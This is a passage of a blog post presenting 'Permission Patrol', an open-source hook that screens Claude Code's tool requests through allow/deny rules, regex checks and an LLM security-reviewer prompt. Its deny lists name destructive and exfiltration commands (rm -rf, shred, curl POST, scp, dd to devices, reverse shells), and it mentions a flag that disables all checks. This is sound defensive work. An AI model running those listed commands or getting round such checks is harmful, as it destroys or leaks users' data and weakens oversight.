</span></span><span style=display:flex><span>    sys<span style=color:#f92672>.</span>exit(<span style=color:#ae81ff>0</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># Ask user — exit 0 with NO JSON output</span>
</span></span><span style=display:flex><span><span style=color:#75715e># Claude Code falls back to showing the standard permission dialog</span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>ask_user</span>():
</span></span><span style=display:flex><span>    sys<span style=color:#f92672>.</span>exit(<span style=color:#ae81ff>0</span>)  <span style=color:#75715e># no output = let user decide</span>
</span></span></code></pre></div><h3 id=deterministic-rules-zero-cost>Deterministic Rules (Zero Cost)<a hidden class=anchor aria-hidden=true href=#deterministic-rules-zero-cost>#</a></h3><p>Common operations are handled by <code>settings.json</code> allow/deny rules — no API call, no latency:</p><ul><li><strong>Deny</strong>: <code>rm -rf</code>, <code>shred</code>, <code>curl POST</code>, <code>scp</code>, <code>gh repo delete</code></li><li><strong>Allow</strong>: <code>git status</code>, <code>ls</code>, <code>Read</code>, <code>ruff</code>, <code>mypy</code>, <code>eslint</code>, trusted domains</li></ul><p>The hook also has its own regex layer for patterns that slip past <code>settings.json</code> (e.g., <code>rm /home/...</code>, <code>dd of=/dev/</code>, reverse shell patterns).</p><h3 id=script-content-inspection-the-key-feature>Script Content Inspection (The Key Feature)<a hidden class=anchor aria-hidden=true href=#script-content-inspection-the-key-feature>#</a></h3><p>When you run <code>python3 script.py</code>, <code>pytest</code>, or <code>node app.js</code>, the hook:</p><ol><li>Detects the script execution pattern</li><li><strong>Reads the actual file content</strong> (up to 5KB)</li><li>Sends both the command and script content to Claude for review</li><li>Claude checks for dangerous patterns: <code>shutil.rmtree</code>, <code>os.remove</code>, <code>requests.post</code>, code injection, etc.</li><li>Returns allow/deny/ask based on the analysis</li></ol><p>Here&rsquo;s how the script content is injected into the review prompt — this is the part prompt hooks simply cannot do:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#75715e># Detect script execution and read the file</span>
</span></span><span style=display:flex><span>script_match <span style=color:#f92672>=</span> re<span style=color:#f92672>.</span>search(
</span></span><span style=display:flex><span>    <span style=color:#e6db74>r</span><span style=color:#e6db74>&#39;\b(python|python3|node|bash|sh)\s+([^\s;|&amp;]+)&#39;</span>, command
</span></span><span style=display:flex><span>)
</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span> script_match:
</span></span><span style=display:flex><span>    script_path <span style=color:#f92672>=</span> script_match<span style=color:#f92672>.</span>group(<span style=color:#ae81ff>2</span>)
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>with</span> open(script_full_path, <span style=color:#e6db74>&#34;r&#34;</span>) <span style=color:#66d9ef>as</span> f:
</span></span><span style=display:flex><span>        script_content <span style=color:#f92672>=</span> f<span style=color:#f92672>.</span>read()[:<span style=color:#ae81ff>5000</span>]  <span style=color:#75715e># read up to 5KB</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># Build the review prompt with script content included</span>
</span></span><span style=display:flex><span>prompt <span style=color:#f92672>=</span> <span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;&#34;&#34;You are a security reviewer for Claude Code.
</span></span></span><span style=display:flex><span><span style=color:#e6db74>
</span></span></span><span style=display:flex><span><span style=color:#e6db74>## Request Information
</span></span></span><span style=display:flex><span><span style=color:#e6db74>- Tool: </span><span style=color:#e6db74>{</span>tool_name<span style=color:#e6db74>}</span><span style=color:#e6db74>
</span></span></span><span style=display:flex><span><span style=color:#e6db74>- Parameters: </span><span style=color:#e6db74>{</span>json<span style=color:#f92672>.</span>dumps(tool_input)<span style=color:#e6db74>}</span><span style=color:#e6db74>
</span></span></span><span style=display:flex><span><span style=color:#e6db74>
</span></span></span><span style=display:flex><span><span style=color:#e6db74>## Script Content
</span></span></span><span style=display:flex><span><span style=color:#e6db74>```
</span></span></span><span style=display:flex><span><span style=color:#e6db74></span><span style=color:#e6db74>{</span>script_content<span style=color:#e6db74>}</span><span style=color:#e6db74>
</span></span></span><span style=display:flex><span><span style=color:#e6db74>```
</span></span></span><span style=display:flex><span><span style=color:#e6db74>
</span></span></span><span style=display:flex><span><span style=color:#e6db74>## Response Format (pure JSON)
</span></span></span><span style=display:flex><span><span style=color:#e6db74></span><span style=color:#ae81ff>{{</span><span style=color:#e6db74>&#34;decision&#34;: &#34;allow&#34;</span><span style=color:#ae81ff>}}</span><span style=color:#e6db74>
</span></span></span><span style=display:flex><span><span style=color:#e6db74>or </span><span style=color:#ae81ff>{{</span><span style=color:#e6db74>&#34;decision&#34;: &#34;deny&#34;, &#34;reason&#34;: &#34;...&#34;</span><span style=color:#ae81ff>}}</span><span style=color:#e6db74>
</span></span></span><span style=display:flex><span><span style=color:#e6db74>or </span><span style=color:#ae81ff>{{</span><span style=color:#e6db74>&#34;decision&#34;: &#34;ask&#34;, &#34;reason&#34;: &#34;...&#34;</span><span style=color:#ae81ff>}}</span><span style=color:#e6db74>
</span></span></span><span style=display:flex><span><span style=color:#e6db74>&#34;&#34;&#34;</span>
</span></span></code></pre></div><h3 id=calling-claude-cli-no-api-key-required>Calling Claude CLI (No API Key Required)<a hidden class=anchor aria-hidden=true href=#calling-claude-cli-no-api-key-required>#</a></h3><p>The hook calls Claude CLI in print mode, which uses your existing Claude Code subscription — no separate API key needed:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span>result <span style=color:#f92672>=</span> subprocess<span style=color:#f92672>.</span>run(
</span></span><span style=display:flex><span>    [<span style=color:#e6db74>&#34;claude&#34;</span>, <span style=color:#e6db74>&#34;-p&#34;</span>, prompt, <span style=color:#e6db74>&#34;--model&#34;</span>, <span style=color:#e6db74>&#34;opus&#34;</span>, <span style=color:#e6db74>&#34;--output-format&#34;</span>, <span style=color:#e6db74>&#34;text&#34;</span>],
</span></span><span style=display:flex><span>    capture_output<span style=color:#f92672>=</span><span style=color:#66d9ef>True</span>, text<span style=color:#f92672>=</span><span style=color:#66d9ef>True</span>, timeout<span style=color:#f92672>=</span><span style=color:#ae81ff>30</span>
</span></span><span style=display:flex><span>)
</span></span><span style=display:flex><span>parsed <span style=color:#f92672>=</span> json<span style=color:#f92672>.</span>loads(result<span style=color:#f92672>.</span>stdout<span style=color:#f92672>.</span>strip())
</span></span><span style=display:flex><span>decision <span style=color:#f92672>=</span> parsed[<span style=color:#e6db74>&#34;decision&#34;</span>]  <span style=color:#75715e># &#34;allow&#34;, &#34;deny&#34;, or &#34;ask&#34;</span>
</span></span></code></pre></div><h3 id=path-aware-decisions>Path-Aware Decisions<a hidden class=anchor aria-hidden=true href=#path-aware-decisions>#</a></h3><p>Even when Claude approves, the hook adds extra safety based on path classification:</p><ul><li><strong>Inside project directory</strong>: Claude can auto-approve</li><li><strong>Outside project / sensitive paths</strong> (<code>~/.ssh</code>, <code>/etc/</code>, <code>.env</code>): User always has the final say — Claude&rsquo;s verdict is advisory only</li><li>Desktop notification on Linux so you know Claude already reviewed it</li></ul><h2 id=no-api-key-required>No API Key Required<a hidden class=anchor aria-hidden=true href=#no-api-key-required>#</a></h2><p>Permission Patrol calls Claude CLI internally, which uses your Claude Code subscription quota. No separate API key, no extra cost setup. Just install and go.</p><h2 id=getting-started>Getting Started<a hidden class=anchor aria-hidden=true href=#getting-started>#</a></h2><h3 id=1-clone-the-repo>1. Clone the repo<a hidden class=anchor aria-hidden=true href=#1-clone-the-repo>#</a></h3><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>git clone https://github.com/stillcuriouscat/permission-patrol.git
</span></span></code></pre></div><h3 id=2-merge-permissions-into-your-settings>2. Merge permissions into your settings<a hidden class=anchor aria-hidden=true href=#2-merge-permissions-into-your-settings>#</a></h3><p>Add the allow/deny rules from <code>permissions.json</code> to your <code>~/.claude/settings.json</code>:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-json data-lang=json><span style=display:flex><span>{
</span></span><span style=display:flex><span>  <span style=color:#f92672>&#34;permissions&#34;</span>: {
</span></span><span style=display:flex><span>    <span style=color:#f92672>&#34;allow&#34;</span>: [
</span></span><span style=display:flex><span>      <span style=color:#e6db74>&#34;Bash(git *)&#34;</span>,
</span></span><span style=display:flex><span>      <span style=color:#e6db74>&#34;Bash(gh *)&#34;</span>,
</span></span><span style=display:flex><span>      <span style=color:#e6db74>&#34;WebFetch(domain:github.com)&#34;</span>
</span></span><span style=display:flex><span>    ],
</span></span><span style=display:flex><span>    <span style=color:#f92672>&#34;deny&#34;</span>: [
</span></span><span style=display:flex><span>      <span style=color:#e6db74>&#34;Bash(rm -rf *)&#34;</span>,
</span></span><span style=display:flex><span>      <span style=color:#e6db74>&#34;Bash(gh repo delete *)&#34;</span>
</span></span><span style=display:flex><span>    ]
</span></span><span style=display:flex><span>  }
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><h3 id=3-add-the-hook>3. Add the hook<a hidden class=anchor aria-hidden=true href=#3-add-the-hook>#</a></h3><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-json data-lang=json><span style=display:flex><span>{
</span></span><span style=display:flex><span>  <span style=color:#f92672>&#34;hooks&#34;</span>: {
</span></span><span style=display:flex><span>    <span style=color:#f92672>&#34;PermissionRequest&#34;</span>: [
</span></span><span style=display:flex><span>      {
</span></span><span style=display:flex><span>        <span style=color:#f92672>&#34;matcher&#34;</span>: <span style=color:#e6db74>&#34;*&#34;</span>,
</span></span><span style=display:flex><span>        <span style=color:#f92672>&#34;hooks&#34;</span>: [
</span></span><span style=display:flex><span>          {
</span></span><span style=display:flex><span>            <span style=color:#f92672>&#34;type&#34;</span>: <span style=color:#e6db74>&#34;command&#34;</span>,
</span></span><span style=display:flex><span>            <span style=color:#f92672>&#34;command&#34;</span>: <span style=color:#e6db74>&#34;python3 /path/to/permission-patrol/permission-guard.py&#34;</span>,
</span></span><span style=display:flex><span>            <span style=color:#f92672>&#34;timeout&#34;</span>: <span style=color:#ae81ff>30000</span>
</span></span><span style=display:flex><span>          }
</span></span><span style=display:flex><span>        ]
</span></span><span style=display:flex><span>      }
</span></span><span style=display:flex><span>    ]
</span></span><span style=display:flex><span>  }
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><h3 id=4-restart-claude-code>4. Restart Claude Code<a hidden class=anchor aria-hidden=true href=#4-restart-claude-code>#</a></h3><p>That&rsquo;s it. Permission Patrol is now guarding your sessions.</p><h2 id=what-i-learned-building-this>What I Learned Building This<a hidden class=anchor aria-hidden=true href=#what-i-learned-building-this>#</a></h2><ol><li><p><strong>Command hooks are underrated.</strong> Most examples use prompt hooks, but command hooks can do so much more — read files, check network state, verify git status.</p></li><li><p><strong>Deterministic rules first, AI second.</strong> Using <code>settings.json</code> rules for common patterns means zero latency and zero cost for 90% of operations. AI review is reserved for the ambiguous cases.</p></li><li><p><strong>Defense in depth.</strong> No single check is perfect. Combining regex patterns, file content inspection, path checks, and AI review creates multiple layers of security.</p></li></ol><h2 id=frequently-asked-questions>Frequently Asked Questions<a hidden class=anchor aria-hidden=true href=#frequently-asked-questions>#</a></h2><h3 id=does-permission-patrol-work-with---dangerously-skip-permissions>Does Permission Patrol work with <code>--dangerously-skip-permissions</code>?<a hidden class=anchor aria-hidden=true href=#does-permission-patrol-work-with---dangerously-skip-permissions>#</a></h3><p>No — and that&rsquo;s the point. <code>--dangerously-skip-permissions</code> disables <strong>all</strong> permission checks, including hooks. Permission Patrol is designed for normal mode, where it replaces the manual &ldquo;Allow/Deny&rdquo; workflow with automated, intelligent review. You get the speed of skip-permissions with the safety of human review.</p><h3 id=how-is-a-command-hook-different-from-a-prompt-hook>How is a command hook different from a prompt hook?<a hidden class=anchor aria-hidden=true href=#how-is-a-command-hook-different-from-a-prompt-hook>#</a></h3><p>A <strong>prompt hook</strong> asks an LLM to review the command string (e.g., <code>python3 script.py</code>). A <strong>command hook</strong> runs a script that can do anything — including reading the actual file content before execution. Permission Patrol uses a command hook so it can inspect what&rsquo;s <em>inside</em> scripts, not just the command name.</p><h3 id=does-it-require-a-separate-api-key>Does it require a separate API key?<a hidden class=anchor aria-hidden=true href=#does-it-require-a-separate-api-key>#</a></h3><p>No. Permission Patrol calls <code>claude</code> CLI internally, which uses your existing Claude Code subscription. No extra API key, no additional cost.</p><h3 id=what-dangerous-patterns-does-it-catch>What dangerous patterns does it catch?<a hidden class=anchor aria-hidden=true href=#what-dangerous-patterns-does-it-catch>#</a></h3><p>Permission Patrol catches patterns in two layers:</p><ul><li><strong>Regex (instant, no AI):</strong> <code>rm -rf</code>, <code>shred</code>, <code>curl POST</code>, <code>scp</code>, <code>wget</code>, <code>chmod 777</code>, data exfiltration commands</li><li><strong>AI review (Claude):</strong> <code>shutil.rmtree()</code>, <code>os.remove()</code>, <code>requests.post()</code>, obfuscated code, file system access outside the project, code injection patterns</li></ul><h3 id=does-it-slow-down-claude-code>Does it slow down Claude Code?<a hidden class=anchor aria-hidden=true href=#does-it-slow-down-claude-code>#</a></h3><p>Deterministic allow/deny rules add near-zero latency. AI review takes a few seconds via Claude CLI — only triggered for ambiguous cases like script execution or sensitive paths. In practice, 90%+ of operations are handled by deterministic rules instantly.</p><h3 id=can-i-customize-the-allowdeny-rules>Can I customize the allow/deny rules?<a hidden class=anchor aria-hidden=true href=#can-i-customize-the-allowdeny-rules>#</a></h3><p>Yes. Edit the <code>permissions</code> section in your <code>~/.claude/settings.json</code>. Add patterns to <code>allow</code> for commands you trust, or <code>deny</code> for commands you want blocked. The rules use glob patterns like <code>Bash(git *)</code> or <code>Bash(rm -rf *)</code>.</p><h2 id=links>Links<a hidden class=anchor aria-hidden=true href=#links>#</a></h2><ul><li><strong>GitHub</strong>: <a href=https://github.com/stillcuriouscat/permission-patrol>stillcuriouscat/permission-patrol</a></li><li><strong>Claude Code Hooks Docs</strong>: <a href=https://docs.anthropic.com/en/docs/claude-code/hooks>docs.anthropic.com</a></li><li><strong>License</strong>: MIT — use it, fork it, improve it.</li></ul><hr><p><em>If you&rsquo;re using Claude Code for development, give Permission Patrol a try. And if you find a dangerous pattern it doesn&rsquo;t catch, open an issue — security is a community effort.</em></p></div><footer class=post-footer><ul class=post-tags><li><a href=https://stillcuriouscat.github.io/tags/claude-code/>Claude-Code</a></li><li><a href=https://stillcuriouscat.github.io/tags/ai-security/>Ai-Security</a></li><li><a href=https://stillcuriouscat.github.io/tags/hooks/>Hooks</a></li><li><a href=https://stillcuriouscat.github.io/tags/command-hook/>Command-Hook</a></li><li><a href=https://stillcuriouscat.github.io/tags/python/>Python</a></li><li><a href=https://stillcuriouscat.github.io/tags/open-source/>Open-Source</a></li><li><a href=https://stillcuriouscat.github.io/tags/dangerously-skip-permissions/>Dangerously-Skip-Permissions</a></li><li><a href=https://stillcuriouscat.github.io/tags/prompt-injection/>Prompt-Injection</a></li><li><a href=https://stillcuriouscat.github.io/tags/defense-in-depth/>Defense-in-Depth</a></li><li><a href=https://stillcuriouscat.github.io/tags/script-inspection/>Script-Inspection</a></li></ul><ul class=share-buttons><li><a target=_blank rel="noopener noreferrer" aria-label="share Permission Patrol: An AI Security Guard for Claude Code on x" href="https://x.com/intent/tweet/?text=Permission%20Patrol%3a%20An%20AI%20Security%20Guard%20for%20Claude%20Code&amp;url=https%3a%2f%2fstillcuriouscat.github.io%2fposts%2fpermission-patrol-ai-security-guard-for-claude-code%2f&amp;hashtags=claude-code%2cai-security%2chooks%2ccommand-hook%2cpython%2copen-source%2cdangerously-skip-permissions%2cprompt-injection%2cdefense-in-depth%2cscript-inspection"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentcolor"><path d="M512 62.554V449.446C512 483.97 483.97 512 449.446 512H62.554C28.03 512 0 483.97.0 449.446V62.554C0 28.03 28.029.0 62.554.0H449.446C483.971.0 512 28.03 512 62.554zM269.951 190.75 182.567 75.216H56L207.216 272.95 63.9 436.783h61.366L235.9 310.383l96.667 126.4H456L298.367 228.367l134-153.151H371.033zM127.633 110h36.468l219.38 290.065H349.5z"/></svg></a></li><li><a target=_blank rel="noopener noreferrer" aria-label="share Permission Patrol: An AI Security Guard for Claude Code on linkedin" href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https%3a%2f%2fstillcuriouscat.github.io%2fposts%2fpermission-patrol-ai-security-guard-for-claude-code%2f&amp;title=Permission%20Patrol%3a%20An%20AI%20Security%20Guard%20for%20Claude%20Code&amp;summary=Permission%20Patrol%3a%20An%20AI%20Security%20Guard%20for%20Claude%20Code&amp;source=https%3a%2f%2fstillcuriouscat.github.io%2fposts%2fpermission-patrol-ai-security-guard-for-claude-code%2f"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentcolor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM160.461 423.278V197.561h-75.04v225.717h75.04zm270.539.0V293.839c0-69.333-37.018-101.586-86.381-101.586-39.804.0-57.634 21.891-67.617 37.266v-31.958h-75.021c.995 21.181.0 225.717.0 225.717h75.02V297.222c0-6.748.486-13.492 2.474-18.315 5.414-13.475 17.767-27.434 38.494-27.434 27.135.0 38.007 20.707 38.007 51.037v120.768H431zM123.448 88.722C97.774 88.722 81 105.601 81 127.724c0 21.658 16.264 39.002 41.455 39.002h.484c26.165.0 42.452-17.344 42.452-39.002-.485-22.092-16.241-38.954-41.943-39.002z"/></svg></a></li><li><a target=_blank rel="noopener noreferrer" aria-label="share Permission Patrol: An AI Security Guard for Claude Code on reddit" href="https://reddit.com/submit?url=https%3a%2f%2fstillcuriouscat.github.io%2fposts%2fpermission-patrol-ai-security-guard-for-claude-code%2f&title=Permission%20Patrol%3a%20An%20AI%20Security%20Guard%20for%20Claude%20Code"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentcolor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM446 265.638c0-22.964-18.616-41.58-41.58-41.58-11.211.0-21.361 4.457-28.841 11.666-28.424-20.508-67.586-33.757-111.204-35.278l18.941-89.121 61.884 13.157c.756 15.734 13.642 28.29 29.56 28.29 16.407.0 29.706-13.299 29.706-29.701.0-16.403-13.299-29.702-29.706-29.702-11.666.0-21.657 6.792-26.515 16.578l-69.105-14.69c-1.922-.418-3.939-.042-5.585 1.036-1.658 1.073-2.811 2.761-3.224 4.686l-21.152 99.438c-44.258 1.228-84.046 14.494-112.837 35.232-7.468-7.164-17.589-11.591-28.757-11.591-22.965.0-41.585 18.616-41.585 41.58.0 16.896 10.095 31.41 24.568 37.918-.639 4.135-.99 8.328-.99 12.576.0 63.977 74.469 115.836 166.33 115.836s166.334-51.859 166.334-115.836c0-4.218-.347-8.387-.977-12.493 14.564-6.47 24.735-21.034 24.735-38.001zM326.526 373.831c-20.27 20.241-59.115 21.816-70.534 21.816-11.428.0-50.277-1.575-70.522-21.82-3.007-3.008-3.007-7.882.0-10.889 3.003-2.999 7.882-3.003 10.885.0 12.777 12.781 40.11 17.317 59.637 17.317 19.522.0 46.86-4.536 59.657-17.321 3.016-2.999 7.886-2.995 10.885.008 3.008 3.011 3.003 7.882-.008 10.889zm-5.23-48.781c-16.373.0-29.701-13.324-29.701-29.698.0-16.381 13.328-29.714 29.701-29.714 16.378.0 29.706 13.333 29.706 29.714.0 16.374-13.328 29.698-29.706 29.698zM160.91 295.348c0-16.381 13.328-29.71 29.714-29.71 16.369.0 29.689 13.329 29.689 29.71.0 16.373-13.32 29.693-29.689 29.693-16.386.0-29.714-13.32-29.714-29.693z"/></svg></a></li><li><a target=_blank rel="noopener noreferrer" aria-label="share Permission Patrol: An AI Security Guard for Claude Code on facebook" href="https://facebook.com/sharer/sharer.php?u=https%3a%2f%2fstillcuriouscat.github.io%2fposts%2fpermission-patrol-ai-security-guard-for-claude-code%2f"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentcolor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H342.978V319.085h66.6l12.672-82.621h-79.272v-53.617c0-22.603 11.073-44.636 46.58-44.636H425.6v-70.34s-32.71-5.582-63.982-5.582c-65.288.0-107.96 39.569-107.96 111.204v62.971h-72.573v82.621h72.573V512h-191.104c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892z"/></svg></a></li><li><a target=_blank rel="noopener noreferrer" aria-label="share Permission Patrol: An AI Security Guard for Claude Code on whatsapp" href="https://api.whatsapp.com/send?text=Permission%20Patrol%3a%20An%20AI%20Security%20Guard%20for%20Claude%20Code%20-%20https%3a%2f%2fstillcuriouscat.github.io%2fposts%2fpermission-patrol-ai-security-guard-for-claude-code%2f"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentcolor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zm-58.673 127.703c-33.842-33.881-78.847-52.548-126.798-52.568-98.799.0-179.21 80.405-179.249 179.234-.013 31.593 8.241 62.428 23.927 89.612l-25.429 92.884 95.021-24.925c26.181 14.28 55.659 21.807 85.658 21.816h.074c98.789.0 179.206-80.413 179.247-179.243.018-47.895-18.61-92.93-52.451-126.81zM263.976 403.485h-.06c-26.734-.01-52.954-7.193-75.828-20.767l-5.441-3.229-56.386 14.792 15.05-54.977-3.542-5.637c-14.913-23.72-22.791-51.136-22.779-79.287.033-82.142 66.867-148.971 149.046-148.971 39.793.014 77.199 15.531 105.329 43.692 28.128 28.16 43.609 65.592 43.594 105.4-.034 82.149-66.866 148.983-148.983 148.984zm81.721-111.581c-4.479-2.242-26.499-13.075-30.604-14.571-4.105-1.495-7.091-2.241-10.077 2.241-2.986 4.483-11.569 14.572-14.182 17.562-2.612 2.988-5.225 3.364-9.703 1.12-4.479-2.241-18.91-6.97-36.017-22.23C231.8 264.15 222.81 249.484 220.198 245s-.279-6.908 1.963-9.14c2.016-2.007 4.48-5.232 6.719-7.847 2.24-2.615 2.986-4.484 4.479-7.472 1.493-2.99.747-5.604-.374-7.846-1.119-2.241-10.077-24.288-13.809-33.256-3.635-8.733-7.327-7.55-10.077-7.688-2.609-.13-5.598-.158-8.583-.158-2.986.0-7.839 1.121-11.944 5.604-4.105 4.484-15.675 15.32-15.675 37.364.0 22.046 16.048 43.342 18.287 46.332 2.24 2.99 31.582 48.227 76.511 67.627 10.685 4.615 19.028 7.371 25.533 9.434 10.728 3.41 20.492 2.929 28.209 1.775 8.605-1.285 26.499-10.833 30.231-21.295 3.732-10.464 3.732-19.431 2.612-21.298-1.119-1.869-4.105-2.99-8.583-5.232z"/></svg></a></li><li><a target=_blank rel="noopener noreferrer" aria-label="share Permission Patrol: An AI Security Guard for Claude Code on telegram" href="https://telegram.me/share/url?text=Permission%20Patrol%3a%20An%20AI%20Security%20Guard%20for%20Claude%20Code&amp;url=https%3a%2f%2fstillcuriouscat.github.io%2fposts%2fpermission-patrol-ai-security-guard-for-claude-code%2f"><svg viewBox="2 2 28 28" height="30" width="30" fill="currentcolor"><path d="M26.49 29.86H5.5a3.37 3.37.0 01-2.47-1 3.35 3.35.0 01-1-2.47V5.48A3.36 3.36.0 013 3 3.37 3.37.0 015.5 2h21A3.38 3.38.0 0129 3a3.36 3.36.0 011 2.46V26.37a3.35 3.35.0 01-1 2.47 3.38 3.38.0 01-2.51 1.02zm-5.38-6.71a.79.79.0 00.85-.66L24.73 9.24a.55.55.0 00-.18-.46.62.62.0 00-.41-.17q-.08.0-16.53 6.11a.59.59.0 00-.41.59.57.57.0 00.43.52l4 1.24 1.61 4.83a.62.62.0 00.63.43.56.56.0 00.4-.17L16.54 20l4.09 3A.9.9.0 0021.11 23.15zM13.8 20.71l-1.21-4q8.72-5.55 8.78-5.55c.15.0.23.0.23.16a.18.18.0 010 .06s-2.51 2.3-7.52 6.8z"/></svg></a></li><li><a target=_blank rel="noopener noreferrer" aria-label="share Permission Patrol: An AI Security Guard for Claude Code on ycombinator" href="https://news.ycombinator.com/submitlink?t=Permission%20Patrol%3a%20An%20AI%20Security%20Guard%20for%20Claude%20Code&u=https%3a%2f%2fstillcuriouscat.github.io%2fposts%2fpermission-patrol-ai-security-guard-for-claude-code%2f"><svg width="30" height="30" viewBox="0 0 512 512" fill="currentcolor" xmlns:inkscape="http://www.inkscape.org/namespaces/inkscape"><path d="M449.446.0C483.971.0 512 28.03 512 62.554V449.446C512 483.97 483.97 512 449.446 512H62.554C28.03 512 0 483.97.0 449.446V62.554C0 28.03 28.029.0 62.554.0H449.446zM183.8767 87.9921h-62.034L230.6673 292.4508V424.0079h50.6655V292.4508L390.1575 87.9921H328.1233L256 238.2489z"/></svg></a></li></ul></footer><script src=https://giscus.app/client.js data-repo=stillcuriouscat/stillcuriouscat.github.io data-repo-id=R_kgDORKGfXQ data-category=Announcements data-category-id=DIC_kwDORKGfXc4C19yn data-mapping=pathname data-strict=0 data-reactions-enabled=1 data-emit-metadata=0 data-input-position=bottom data-theme=preferred_color_scheme data-lang=en crossorigin=anonymous async></script></article></main><footer class=footer><span>&copy; 2026 <a href=https://stillcuriouscat.github.io/>stillcuriouscat</a></span> ·
<span>Powered by
<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
        <a href=https://github.com/adityatelange/hugo-PaperMod/ rel=noopener target=_blank>PaperMod</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z"/></svg>
</a><script>let menu=document.getElementById("menu");if(menu){const e=localStorage.getItem("menu-scroll-position");e&&(menu.scrollLeft=parseInt(e,10)),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}}document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{const e=document.querySelector("html");e.dataset.theme==="dark"?(e.dataset.theme="light",localStorage.setItem("pref-theme","light")):(e.dataset.theme="dark",localStorage.setItem("pref-theme","dark"))})</script><script>document.querySelectorAll("pre > code").forEach(e=>{const n=e.parentNode.parentNode,t=document.createElement("button");t.classList.add("copy-code"),t.innerHTML="copy";function s(){t.innerHTML="copied!",setTimeout(()=>{t.innerHTML="copy"},2e3)}t.addEventListener("click",t=>{if("clipboard"in navigator){navigator.clipboard.writeText(e.textContent),s();return}const n=document.createRange();n.selectNodeContents(e);const o=window.getSelection();o.removeAllRanges(),o.addRange(n);try{document.execCommand("copy"),s()}catch{}o.removeRange(n)}),n.classList.contains("highlight")?n.appendChild(t):n.parentNode.firstChild==n||(e.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName=="TABLE"?e.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(t):e.parentNode.appendChild(t))})</script></body></html>